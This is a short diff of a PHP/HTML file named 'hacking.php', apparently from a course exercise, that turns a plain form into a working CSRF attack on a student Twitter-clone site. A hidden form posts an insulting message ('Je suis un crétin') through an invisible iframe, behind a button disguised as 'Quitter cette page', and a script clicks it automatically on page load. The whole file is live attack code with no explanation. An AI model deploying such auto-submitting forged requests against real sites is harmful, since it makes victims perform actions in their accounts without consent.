@@ -1,6 +1,18 @@
-<form method="post" action="http://conception.website/3wa/PHP/TP/Twitter/create.php">
+// hacking.php
+<form target="site" method="post" action="http://conception.website/3wa/PHP/TP/Twitter/create.php">
 
-    <input type="hidden" name="content" value="I'm an asshole'">
-    <button type="submit">Envoyer</button>
+	<input type="hidden" name="content" value="Je suis un crétin">
+  
+  <button id="csrfAttack">Quitter cette page</button>
 
 </form>
+
+<iframe style="display:none;" name="site"></iframe>
+
+
+<script>
+var button = document.getElementById('csrfAttack');
+
+button.click();
+
+</script>
